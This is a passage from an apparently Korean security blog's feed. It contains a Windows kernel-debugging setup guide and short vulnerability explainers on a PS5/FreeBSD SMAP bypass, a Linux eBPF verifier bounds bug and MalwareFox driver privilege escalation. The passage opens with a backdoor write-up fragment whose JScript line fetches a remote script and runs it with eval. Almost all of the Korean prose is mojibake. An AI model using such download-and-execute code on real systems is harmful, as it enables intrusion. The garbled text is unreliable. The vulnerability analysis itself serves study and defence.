class="hljs-literal">false</span>);net.Send();js = net.ResponseText;<span class="hljs-built_in">eval</span>(js);</code></pre><p>.NETì˜ Serializationì„ í™œìš©í•˜ì—¬ ìœ„ì˜ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. <code>System.Runtime.Serialization.Formatters.Binary.BinaryFormatters</code>ë¥¼ <code>ActiveXObject</code>ë¡œ í˜¸ì¶œí•˜ë©´ ê°ì²´ë¥¼ base64ë¡œ ì¸ì½”ë”©í•  ìˆ˜ ìˆê³  ë©”ëª¨ë¦¬ì—ì„œ ë””ì½”ë”©ë˜ì–´ ë©”ì¸ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” <a href="https://github.com/tyranid/DotNetToJScript">DotNetToJScript</a>ë¥¼ í†µí•´ ì‰½ê²Œ í™œìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>backdoor</tag>
      
      <tag>idioth</tag>
      
      <tag>malware</tag>
      
      <tag>com</tag>
      
      <tag>vbscript</tag>
      
      <tag>jscript</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] ê³µëŒ€ì˜¤ë¹ ê°€ ì•Œë ¤ì£¼ëŠ” Windows Driver Part 1 - Setting Up Kernel Debugging</title>
    <link href="/2021/05/30/l0ch/windows-driver/"/>
    <url>/2021/05/30/l0ch/windows-driver/</url>
    
    <content type="html"><![CDATA[<h1 id="ì„œë¡ "><a href="#ì„œë¡ " class="headerlink" title="ì„œë¡ "></a>ì„œë¡ </h1><p>ì•ˆë…•í•˜ì„¸ìš”! L0chì…ë‹ˆë‹¤. ì§€ë‚œë²ˆ pwn cool sexy ì‹œë¦¬ì¦ˆì— ì´ì–´ ìƒˆë¡œìš´ ì‹œë¦¬ì¦ˆë¡œ ëŒì•„ì™”ìŠµë‹ˆë‹¤!  ê·¸ ì‚¬ì´ì— ê¸°ë§ê³ ì‚¬ ê¸°ê°„ì´ ëœ ê±´ ë¤.. </p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%201.png" alt="windows-driver/Untitled%201.png"></p><blockquote><p>ê³¼ê±°ì˜ ë‚˜ì•¼.. ë„ˆ ê¸°ë§ë„ ë§í–ˆì–´</p></blockquote><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%202.png" alt="windows-driver/Untitled%202.png"></p><p>êµìˆ˜ë‹˜ ì¢…ê°•ì¢€ìš”ã… ã… ã… </p><p>ì´ë²ˆ ì‹œë¦¬ì¦ˆì—ì„œëŠ” í•˜ë£¨í•œì¤„ì„ ë³´ë‹¤ ë³´ë©´ ê½¤ ìì£¼ ë‚˜ì˜¤ëŠ” Windows third-party driverì˜ ê¶Œí•œìƒìŠ¹ ì·¨ì•½ì ì„ ë‹¤ë£° ì˜ˆì •ì…ë‹ˆë‹¤! </p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%203.png" alt="windows-driver/Untitled%203.png"></p><blockquote><p>ì´ ë“œë¼ì´ë²„ ì•„ë‹˜ã…ã…;</p></blockquote><p>ì˜ˆì‹œë¥¼ í•˜ë‚˜ ë“¤ì–´ë³´ìë©´.. ìµœê·¼ ì´ìŠˆê°€ ëœ Dellì˜ BIOS ì—…ë°ì´íŠ¸ì— ì‚¬ìš©ë˜ëŠ” ë“œë¼ì´ë²„ì—ì„œ ë‚˜ì˜¨ <a href="https://hackyboiz.github.io/2021/05/07/l0ch/2021-05-07/">[í•˜ë£¨í•œì¤„] CVE-2021-21551: ìˆ˜ì–µ ëŒ€ì˜ Dell PCì— ì˜í–¥ì„ ì£¼ëŠ” ê¶Œí•œ ìƒìŠ¹ ì·¨ì•½ì  </a> ì •ë„ê°€ ìˆê² ë„¤ìš”. ëŒ€ì¶© ì‹¬ê°í•œ ì·¨ì•½ì ì¸ê±´ ì•Œê² ëŠ”ë° IOCTLì€ ë­ê³ â€¦ <code>EPROCESS</code>? í† í°ì„ ì–´ë–»ê²Œ ë®ì–´ ì“´ë‹¤ëŠ” ê±´ì§€ ë˜ ê¶Œí•œìƒìŠ¹ì€ ì–´ë–»ê²Œ í•œë‹¤ëŠ” ê±´ì§€.. ì •ë§ ëª¨ë¥´ëŠ” ìš©ì–´, ê°œë… íˆ¬ì„±ì´ë„¤ìš”. ê³µë¶€í• ê²Œ ë„ˆë¬´ ë§ì§€ë§Œ ã… ã… ã…  í•˜ë‚˜ì”© ê³µë¶€í•˜ë‹¤ë³´ë©´ ì–¸ì  ê°€ëŠ” ë“œë¼ì´ë²„ ì·¨ì•½ì ì„ ì°¾ì„ìˆ˜ë„ ìˆê² ì£ ?</p><p>ì˜¤ëŠ˜ì€ ì‹œë¦¬ì¦ˆ ì²« ê¸€ì´ë‹ˆ ê°€ë³ê²Œ ë””ë²„ê¹… í™˜ê²½ ì„¸íŒ…ìœ¼ë¡œ ì‹œì‘í•´ì„œ ì•ìœ¼ë¡œ ê°„ë‹¨í•œ exploit ì˜ˆì œë¥¼ ë‹¤ë£¨ê³ , one-day ë¶„ì„í•˜ëŠ” ê²ƒì„ ëìœ¼ë¡œ ë§ˆë¬´ë¦¬í•˜ë ¤ê³  í•©ë‹ˆë‹¤. ì´ë²ˆ ì‹œë¦¬ì¦ˆë„ ê¸¸ì–´ì§ˆ ê²ƒ ê°™ì€ ì˜ˆê°ì´ ë“œëŠ” ê±´.. ê¸°ë¶„ íƒ“ì¸ê°€..?</p><h1 id="ì¤€ë¹„"><a href="#ì¤€ë¹„" class="headerlink" title="ì¤€ë¹„"></a>ì¤€ë¹„</h1><p>ìš°ì„  ë””ë²„ê¹… ì„¸íŒ…ë¶€í„° í•´ì•¼ í•©ë‹ˆë‹¤. ì»¤ë„ ë””ë²„ê¹…ì€ ìœ ì € ëª¨ë“œ ì• í”Œë¦¬ì¼€ì´ì…˜ê³¼ ë‹¬ë¦¬ ë¡œì»¬ì—ì„œ ë””ë²„ê¹…í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤. ì™„ì „íˆ ë¶ˆê°€ëŠ¥í•œ ê²ƒì€ ì•„ë‹ˆì§€ë§Œ ì œì•½ì‚¬í•­ì´ ë§ì£ . ê·¸ë˜ì„œ! ë³´í†µì€ ì›ê²©ì§€ PCë¥¼ í•˜ë‚˜ êµ¬ì„±í•´ ë””ë²„ê±°ë¥¼ ì„¸íŒ…í•©ë‹ˆë‹¤.</p><p>ì´ì „ì—ëŠ” named pipeë¥¼ ì‚¬ìš©í•´ ê°€ìƒ ì‹œë¦¬ì–¼ í¬íŠ¸ë¡œ ì»¤ë„ ë””ë²„ê¹…ì„ í–ˆì§€ë§Œ ì‹œë¦¬ì–¼ í¬íŠ¸ ì†ë„ì˜ í•œê³„ë¡œ KDNET ë„¤íŠ¸ì›Œí¬ ë””ë²„ê¹…ì„ ì‚¬ìš©í•˜ë©° í•„ìš”í•œ ì¤€ë¹„ëŠ” ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.</p><p><strong>1. í˜¸ìŠ¤íŠ¸ Windowsì™€ VMware or Hyper-Vì˜ ê²ŒìŠ¤íŠ¸ Windows</strong></p><p>Windbgë¥¼ ì‚¬ìš©í•´ ì»¤ë„ì„ ë¶„ì„í•  ê²ƒì´ê¸° ë•Œë¬¸ì— ë¶„ì„ëŒ€ìƒì´ ë˜ëŠ” ë””ë²„ê¸° Windowsì™€ ë¶„ì„ì„ ì§„í–‰í•  Windowsê°€ ê°ê° í•„ìš”í•©ë‹ˆë‹¤. í˜¸ìŠ¤íŠ¸ê°€ Windows í™˜ê²½ì´ë©´ ê²ŒìŠ¤íŠ¸ Windows VM í•˜ë‚˜ë§Œ ì˜¬ë¦¬ë©´ ë©ë‹ˆë‹¤. </p><p><img src="/2021/05/30/l0ch/windows-driver/tempsnip.png" alt="windows-driver/tempsnip.png"></p><blockquote><p>?</p></blockquote><p>ë„¤ ì €ëŠ” ë§¥ì„ ì‚¬ìš©í•˜ê¸° ë•Œë¬¸ì—â€¦..  Windows VM ë‘ê°œë¥¼ ì˜¬ë ¤ì„œ ì§„í–‰í–ˆìŠµë‹ˆë‹¤. </p><p>ë„¤? ì–´ë””ì„œ ë­ê°€ ëŒì•„ê°€ëŠ” ì†Œë¦¬ ì•ˆë‚˜ëƒêµ¬ìš”?</p><p>.</p><p>.</p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%204.png" alt="windows-driver/Untitled%204.png"></p><blockquote><p>ì´ë¥™í•œë“œì•„ì•„ã…ã… !!!</p></blockquote><p>ë§¥ì´ ì˜ ë²„í…¨ì£¼ê³  ìˆìœ¼ë‹ˆ ë‹¤í–‰ì´ë„¤ìš” ã…ã… ì•„ë‹˜ë§ê³ <br>ê¸€ì—ì„œëŠ” í¸ì˜ìƒ í˜¸ìŠ¤íŠ¸ OSê°€ Windowsë¼ê³  ê°€ì •í•˜ê³  ë¶„ì„í•  ë””ë²„ê¸° Windowsë¥¼ ê²ŒìŠ¤íŠ¸ë¼ê³  ë¶€ë¥´ê² ìŠµë‹ˆë‹¤! </p><p><strong>2. ë¸”ë£¨ìŠ¤í¬ë¦°ì„ ì¹œêµ¬ì²˜ëŸ¼ ìƒê°í•˜ëŠ” ê°•ì¸í•œ ë©˜íƒˆ(?)</strong></p><p>ì‚¬ì‹¤ ì·¨ì•½ì  ì°¾ëŠ” ì…ì¥ì—ì„œ ë¸”ë£¨ìŠ¤í¬ë¦°ì€ ê³§ í¬ë˜ì‹œê¸° ë•Œë¬¸ì— ë¸”ë£¨ìŠ¤í¬ë¦°ì„ ë³¸ë‹¤ë©´ ê°œì´ë“ì´ì£ ã…‹ã…‹  </p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%205.png" alt="windows-driver/Untitled%205.png"></p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%206.png" alt="windows-driver/Untitled%206.png"></p><blockquote><p>í¸ì•ˆ-</p></blockquote><p>ë©˜íƒˆê¹Œì§€ ì¤€ë¹„ê°€ ëª¨ë‘ ë˜ì—ˆë‹¤? ë°”ë¡œ ë””ë²„ê¹… ì„¸íŒ…ìœ¼ë¡œ ê³ ê³ ê³ </p><h1 id="Setting-Up-Debugging"><a href="#Setting-Up-Debugging" class="headerlink" title="Setting Up Debugging"></a>Setting Up Debugging</h1><p>ë¨¼ì € ê²ŒìŠ¤íŠ¸ì™€ í˜¸ìŠ¤íŠ¸ Windowsì— <a href="https://docs.microsoft.com/ko-kr/windows-hardware/drivers/debugger/debugger-download-tools">Windbg</a>ë¥¼ ì„¤ì¹˜í•©ë‹ˆë‹¤. í˜¸ìŠ¤íŠ¸ Windowsì—ëŠ” Windbg Previewë¥¼ ì„¤ì¹˜í•´ ì‚¬ìš©í•´ë„ ë˜ì§€ë§Œ Windbg PreviewëŠ” kdnetì´ ì—†ê¸° ë•Œë¬¸ì— ê²ŒìŠ¤íŠ¸ Windowsì—ëŠ” Windbgë¥¼ SDKë¡œ ì„¤ì¹˜í•´ì•¼ í•©ë‹ˆë‹¤!</p><p><img src="/2021/05/30/l0ch/windows-driver/tempsnip%201.png" alt="windows-driver/tempsnip%201.png"></p><p>Windbg ì„¤ì¹˜ë¥¼ ëëƒˆìœ¼ë©´ ê²ŒìŠ¤íŠ¸ VM ì„¤ì •â†’Network Adapterì—ì„œ Network connectionì„ Bridgedë¡œ ì„¤ì •í•´ í˜¸ìŠ¤íŠ¸ì™€ í†µì‹ í•  ìˆ˜ ìˆê²Œ ì„¤ì •í•œ ë’¤ í†µì‹ ì´ ì˜ ë˜ëŠ”ì§€ í…ŒìŠ¤íŠ¸ë¥¼ í•´ë´…ë‹ˆë‹¤.</p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%207.png" alt="windows-driver/Untitled%207.png"></p><p>í•‘ í…ŒìŠ¤íŠ¸ í•  ë•ŒëŠ” í˜¸ìŠ¤íŠ¸ì™€ ê²ŒìŠ¤íŠ¸ ëª¨ë‘ ë°©í™”ë²½ì—ì„œ ICMP ì¸ë°”ìš´ë“œ í—ˆìš©í•˜ëŠ” ê²ƒ ìŠì§€ ë§ˆì„¸ìš”!</p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%208.png" alt="windows-driver/Untitled%208.png"></p><p>ì •ìƒì ìœ¼ë¡œ í†µì‹ ì´ ë˜ëŠ” ê±¸ í™•ì¸í–ˆìœ¼ë©´ í˜¸ìŠ¤íŠ¸ì˜ host nameì„ í™•ì¸í•©ë‹ˆë‹¤.</p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%209.png" alt="windows-driver/Untitled%209.png"></p><p>ê²ŒìŠ¤íŠ¸ì—ì„œ cmdë¥¼ ê´€ë¦¬ì ê¶Œí•œìœ¼ë¡œ ì‹¤í–‰í•´ ë‹¤ìŒê³¼ ê°™ì´ <code>kdnet.exe</code>ì„ ì‹¤í–‰í•©ë‹ˆë‹¤. ì´ë•Œ í¬íŠ¸ëŠ” 50000 ~ 50039 ë²”ìœ„ ì•ˆì—ì„œ ì¤ë‹ˆë‹¤.</p><pre><code class="hljs angelscript">&gt; kdnet.exe &lt;host name&gt; <span class="hljs-number">50001</span></code></pre><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%2010.png" alt="windows-driver/Untitled%2010.png"></p><p>í•´ë‹¹ ë¨¸ì‹ ì„ ë””ë²„ê¹…í•˜ê¸° ìœ„í•´ ì»¤ë§¨ë“œë¥¼ í˜¸ìŠ¤íŠ¸ ë¨¸ì‹ ì—ì„œ ì‹¤í–‰í•˜ë¼ê³  í•˜ë„¤ìš”! ë¹¨ê°„ ë°•ìŠ¤ì˜ ì»¤ë§¨ë“œë¥¼ ë³µì‚¬í•´ë†“ìŠµë‹ˆë‹¤.</p><p>ì´ì œ í˜¸ìŠ¤íŠ¸ì˜ Windbg Previewë¥¼ ì‹¤í–‰í•˜ê³  Start debugging â†’ Attach to Kernel â†’ Net ì—ì„œ í¬íŠ¸ì™€ ì»¤ë§¨ë“œë¥¼ ì…ë ¥í•©ë‹ˆë‹¤.</p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%2011.png" alt="windows-driver/Untitled%2011.png"></p><p>OKë¥¼ ëˆŒëŸ¬ Windbg Previewê°€ ëŒ€ê¸° ìƒíƒœê°€ ë˜ë©´ ê²ŒìŠ¤íŠ¸ë¥¼ <code>shutdown -r -t 0</code> ìœ¼ë¡œ ì¬ë¶€íŒ…í•´ì¤ë‹ˆë‹¤. </p><p>ì¬ë¶€íŒ…í•˜ë©´..!</p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%2012.png" alt="windows-driver/Untitled%2012.png"></p><p>ì˜ ë¶™ì€ ê²ƒ ê°™ì£ ? ë””ë²„ê¸° ë¨¸ì‹ ì¸ ê²ŒìŠ¤íŠ¸ Windowsë„ í™•ì¸í•´ë³¼ê²Œìš”.</p><p><img src="/2021/05/30/l0ch/windows-driver/Untitled%2013.png" alt="windows-driver/Untitled%2013.png"></p><p>ë””ë²„ê±°ê°€ ë¶™ì€ ìƒíƒœì—ì„œ ë¶€íŒ…ë˜ë©´ ìš°ì¸¡ í•˜ë‹¨ì— í…ŒìŠ¤íŠ¸ ëª¨ë“œì™€ ë¹Œë“œ ë²„ì „ ì •ë³´ê°€ í‘œì‹œë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. </p><p>ë‹¤ìŒ íŒŒíŠ¸ë¶€í„°ëŠ” ë³¸ê²©ì ìœ¼ë¡œ Windowsì˜ third-party driverì™€ ì·¨ì•½ì , one-day ë¶„ì„ê¹Œì§€ ì•Œì•„ë³´ë„ë¡ í•˜ê² ìŠµë‹ˆë‹¤ ã…ã…</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>kernel</tag>
      
      <tag>L0ch</tag>
      
      <tag>research</tag>
      
      <tag>windows driver</tag>
      
      <tag>debugging</tag>
      
      <tag>kernel debugging</tag>
      
      <tag>third-party driver exploitation</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-29628 : PlayStation5 SMAP Bypass</title>
    <link href="/2021/05/30/j0ker/2021-05-30/"/>
    <url>/2021/05/30/j0ker/2021-05-30/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/1048322">SMAP bypass(PS5)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>PlayStation5, FreeBSD 12</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>SMAP(Supervisor-Mode Access Prevention)ì€ ì»¤ë„ì—ì„œ ìœ ì €ëœë“œ ë©”ëª¨ë¦¬ì— ì ‘ê·¼í•˜ì§€ ëª»í•˜ê²Œ í•˜ì—¬ ì·¨ì•½ì  ìµìŠ¤í”Œë¡œì‡ì„ ì–´ë µê²Œ í•˜ëŠ” ì»¤ë„ ë ˆë²¨ ë³´í˜¸ê¸°ë²•ì…ë‹ˆë‹¤.</p><p>PlayStation 5(ì´í•˜ PS5)ëŠ” FreeBSD 12 ê¸°ë°˜ìœ¼ë¡œ ê°œë°œëœ ìš´ì˜ì²´ì œì¸ Orbis 2.0ì„ ì‚¬ìš©í•©ë‹ˆë‹¤. CVE-2021-29628ì€ FreeBSD 12ì—ì„œ ë°œê²¬ëì—ˆë˜ ì·¨ì•½ì ì´ì§€ë§Œ, PS5ì—ì„œ ì´ ì·¨ì•½ì ì— ëŒ€í•´ íŒ¨ì¹˜ë¥¼ í•˜ì§€ ì•Šì•„ PS5ì—ì„œ SMAPë¥¼ bypassí•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.</p><p>PS5ì—ì„œ SMAPê°€ í™œì„±í™”ë˜ì–´ ìˆëŠ” ìƒíƒœ(<code>Rflags</code>ì˜ <code>Alignment Check Flag</code>, <code>%RFLAGS.AC</code>ê°€ ì„¸íŒ…ë˜ì§€ ì•Šì€ ìƒíƒœ)ì—ì„œ ì»¤ë„ì—ì„œ ìœ ì € í˜ì´ì§€ì— ì ‘ê·¼í•˜ë©´ page faultê°€ ë°œìƒí•©ë‹ˆë‹¤. ë°˜ë©´ì— <code>%RFLAGS.AC</code>ê°€ ì„¸íŒ…ë˜ì§€ ì•Šì€ ìƒíƒœì—ì„œëŠ” ì»¤ë„ì—ì„œ ì •ìƒì ìœ¼ë¡œ ìœ ì € í˜ì´ì§€ì— ì ‘ê·¼ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤. í•˜ì§€ë§Œ FreeBSD ì»¤ë„ì—ì„œëŠ” <code>copyin()</code>ê³¼ <code>copyout()</code> í•¨ìˆ˜ë“¤ì„ í†µí•´ <code>%RFLAGS.AC</code>ë¥¼ ì ì‹œ ì„¸íŒ…í•´ì„œ ìœ ì € í˜ì´ì§€ì— ì ‘ê·¼í•©ë‹ˆë‹¤.</p><pre><code class="hljs wasm">.macroCOPYIN smap erms&#x2F;* ... *&#x2F;movq$copy_fault,PCB_ONFAULT(%r11)&#x2F;* ... *&#x2F;stac &#x2F;&#x2F; set %RFLAGS.AC, to allow access to user pagesdo_the_copyinclac &#x2F;&#x2F; clear %RFLAGS.AC, to forbid access to user pages&#x2F;* ... *&#x2F;copy_fault:movq$0,PCB_ONFAULT(%r11)movl$EFAULT,%eaxPOP_FRAME_POINTERret</code></pre><p><code>copyin()</code> í•¨ìˆ˜ê°€ ì‹¤í–‰ë˜ë©´ fault handlerì¸ <code>copy_fault()</code> í•¨ìˆ˜ë¥¼ handlerë¡œ ë“±ë¡í•œ í›„ <code>%RFLAGS.AC</code>ë¥¼ ì„¸íŒ…í•´ ë³µì‚¬ ì‘ì—…ì„ ì§„í–‰í•©ë‹ˆë‹¤. ê·¸ë¦¬ê³  ë³µì‚¬ ì‘ì—…ì´ ëë‚˜ë©´ ë‹¤ì‹œ <code>%RFLAGS.AC</code>ë¥¼ í´ë¦¬ì–´í•©ë‹ˆë‹¤. ì´ ë•Œ, ë³µì‚¬ ê³¼ì •ì—ì„œ faultê°€ ë°œìƒí•˜ë©´ <code>trap()</code>í•¨ìˆ˜ê°€ ì‹¤í–‰ë©ë‹ˆë‹¤.</p><pre><code class="hljs c"><span class="hljs-keyword">void</span>trap(struct trapframe *frame)&#123;<span class="hljs-comment">/* ... */</span><span class="hljs-keyword">if</span> (curpcb-&gt;pcb_onfault != <span class="hljs-literal">NULL</span>) &#123;frame-&gt;tf_rip = (<span class="hljs-keyword">long</span>)curpcb-&gt;pcb_onfault;<span class="hljs-keyword">return</span>;&#125;<span class="hljs-comment">/* ... */</span>&#125;</code></pre><p><code>trap()</code> í•¨ìˆ˜ì—ì„œëŠ” <code>curpcb-&gt;pcb_onfault</code>ì— ê°’ì´ ë“¤ì–´ê°€ ìˆìœ¼ë©´ ì´ ì•ˆì— ê°’ì„ <code>framâ†’tf_rip</code>ì— ë„£ê³  ë°”ë¡œ return í•˜ëŠ”ë°, ì´ ë•Œ <code>%RFLAGS.AC</code>ë¥¼ í´ë¦¬ì–´í•˜ì§€ ì•Šì•„ SMAPì´ ë¹„í™œì„±í™”ì¸ ìƒíƒœë¡œ í•¸ë“¤ë§ì„ ë§ˆë¬´ë¦¬í•©ë‹ˆë‹¤. ë”°ë¼ì„œ ì´ë¥¼ í†µí•´ SMAPë¥¼ bypassí•˜ì—¬ ì´ ì´í›„ì˜ syscallë“¤ì„ SMAPì´ ë¹„í™œì„±í™”ëœ ìƒíƒœì—ì„œ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>j0ker</tag>
      
      <tag>bypass</tag>
      
      <tag>smap</tag>
      
      <tag>freebsd</tag>
      
      <tag>playstation5</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-31440: Linux Kernel eBPF verifier, incorrect bound check</title>
    <link href="/2021/05/29/fabu1ous/2021-05-29/"/>
    <url>/2021/05/29/fabu1ous/2021-05-29/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/5/26/cve-2021-31440-an-incorrect-bounds-calculation-in-the-linux-kernel-ebpf-verifier">CVE-2021-31440: AN INCORRECT BOUNDS CALCULATION IN THE LINUX KERNEL EBPF VERIFIER</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Linux kernel 5.7 ~ Linux kernel 5.11.15</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>eBPFëŠ” ëŸ°íƒ€ì„ ì¤‘ ì•ˆì „í•˜ê²Œ ì»¤ë„ ì½”ë“œë¥¼ ì‚½ì…í•˜ê¸° ìœ„í•´ Verifierì™€ BPF instructionì„ ì‚¬ìš©í•©ë‹ˆë‹¤. VerifierëŠ” ë ˆì§€ìŠ¤í„°ì˜ ê°’ì˜ ë³€í™”ì™€ ê·¸ ê°’ë“¤ì˜ í—ˆìš© ë²”ìœ„(ì´í•˜ range)ë“±ì„ ì¶”ì í•´ memory loadì™€ storeì˜ out-of-bound ì—¬ë¶€ë¥¼ ê²€ì‚¬í•©ë‹ˆë‹¤. CVE-2021-31440ì„ ì•…ìš©í•˜ë©´ out-of-bound ê²€ì‚¬ë¥¼ ë¬´ë ¥í™”í•˜ê³  ë¡œì»¬ ê¶Œí•œ ìƒìŠ¹ì„ ë…¸ë¦´ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs c">...    <span class="hljs-keyword">if</span> (__reg64_bound_u32(reg-&gt;umin_value))             reg-&gt;u32_min_value = (u32)reg-&gt;umin_value;     <span class="hljs-keyword">if</span> (__reg64_bound_u32(reg-&gt;umax_value))             reg-&gt;u32_max_value = (u32)reg-&gt;umax_value;...</code></pre><p>ìœ„ëŠ” ì·¨ì•½í•œ ì½”ë“œ ë¶€ë¶„ì˜ ì¼ë¶€ì…ë‹ˆë‹¤. ê¸°ì¡´ eBPF ì·¨ì•½ì ë“¤ê³¼ ë§ˆì°¬ê°€ì§€ë¡œ CVE-2021-31440 ë˜í•œ 64 bit rangeì˜ í•˜ìœ„ 32 ë¹„íŠ¸ë¡œë¶€í„° 32 bit rangeë¥¼ ë„ì¶œí•˜ëŠ” ê³¼ì •ì—ì„œ ë²„ê·¸ê°€ ë°œìƒí•©ë‹ˆë‹¤. <code>umin_value</code>ê°€ 1, <code>umax_value</code> ê°€ 1&lt;&lt;32ì´ë¼ í•  ë•Œ <code>u32_min_value</code>ëŠ” 1, <code>u32_max_value</code>ëŠ” 0ìœ¼ë¡œ ì„¤ì •ë˜ê³  ì‹¤ì œ runtime rangeì™€ ë‹¤ë¥¸ ê°’ì„ Verifierì—ê²Œ ì „ë‹¬í•˜ê²Œ ë©ë‹ˆë‹¤.</p><p>VerifierëŠ” ì˜ëª»ëœ ë ˆì§€ìŠ¤í„° í—ˆìš©ë²”ìœ„ë¥¼ ê°–ê²Œ ë˜ê³  ì´ë¥¼ í†µí•´ í•´ì»¤ëŠ” out-of-bound read/write accessê°€ ê°€ëŠ¥í•´ ë¡œì»¬ ê¶Œí•œ ìƒìŠ¹ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>lpe</tag>
      
      <tag>oob</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-31727/31728: MalwareFox AntiMalware ë¡œì»¬ ê¶Œí•œìƒìŠ¹ ì·¨ì•½ì </title>
    <link href="/2021/05/28/l0ch/2021-05-28/"/>
    <url>/2021/05/28/l0ch/2021-05-28/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/irql0/CVE-2021-31728">CVE-2021-31728</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>MalwareFox AntiMalware 2.74.0.150</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ì•ˆí‹° ë©€ì›¨ì–´ ì†Œí”„íŠ¸ì›¨ì–´ì¸ MalwareFoxì—ì„œ ë°œê²¬ëœ ë¡œì»¬ ê¶Œí•œ ìƒìŠ¹ ì·¨ì•½ì ì˜ ì„¸ë¶€ ì •ë³´ ë° PoCê°€ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤. ê³µê°œëœ ì·¨ì•½ì ì€ ë‘ ê°€ì§€ë¡œ, ëª¨ë‘ MalwareFoxì˜ <code>zam64.sys</code> ë° <code>zam32.sys</code> ë“œë¼ì´ë²„ì— ì¡´ì¬í•©ë‹ˆë‹¤. </p><h3 id="CVE-2021-31727"><a href="#CVE-2021-31727" class="headerlink" title="CVE-2021-31727"></a>CVE-2021-31727</h3><p><code>zam64.sys</code>/<code>zam32.sys</code> ë“œë¼ì´ë²„ì˜ IOCTL <code>0x80002014</code> ë° <code>0x80002018</code> ì€ unrestricted disk read/writeê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤. í•´ì»¤ëŠ” ì´ë¥¼ ì•…ìš©í•´ ë¶€íŠ¸ ì„¹í„°ë¥¼ ë®ì–´ì“°ê±°ë‚˜ ë©”ëª¨ë¦¬ ìƒì˜ ì½”ë“œë¥¼ ë®ì–´ì“°ëŠ” ë°©ì‹ìœ¼ë¡œ ê¶Œí•œ ìƒìŠ¹ì„ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h3 id="CVE-2021-31728"><a href="#CVE-2021-31728" class="headerlink" title="CVE-2021-31728"></a>CVE-2021-31728</h3><p>IOCTL <code>0x80002040</code>ì€ UserBufferì—ì„œ ë³µì‚¬ë˜ëŠ” ëŒ€ìƒ ë²„í¼ì¸ NonPagedPoolì—ì„œ ì»¤ë„ ë©”ëª¨ë¦¬ê°€ í• ë‹¹ë˜ë©° ì…ë ¥ ë²„í¼ê°€ <code>0x1000</code> bytesë³´ë‹¤ ì»¤ ì‰˜ì½”ë“œì— ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. IOCTL <code>0x80002018</code> ì€ miniport ë“œë¼ì´ë²„ì˜ IRP_MJ_SCSI_HANDLERì— ëŒ€í•œ í•¨ìˆ˜ë¥¼ ì„¤ì •í•  ìˆ˜ ìˆìœ¼ë©° ì‚¬ìš©ì ì…ë ¥ì— ì˜í•´ ì§€ì •ëœ ë“œë¼ì´ë²„ì— SCSI ìš”ì²­ì„ ë³´ë‚´ ì´ë¥¼ ì´ìš©í•´ ì‰˜ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ìœ„ ì·¨ì•½ì ì„ ì•…ìš©í•˜ë©´ ì•„ë˜ ë°©ë²•ìœ¼ë¡œ ë“œë¼ì´ë²„ ì»¨í…ìŠ¤íŠ¸ì˜ ring0 ì½”ë“œë¥¼ ì‹¤í–‰í•´ ì‹œìŠ¤í…œ 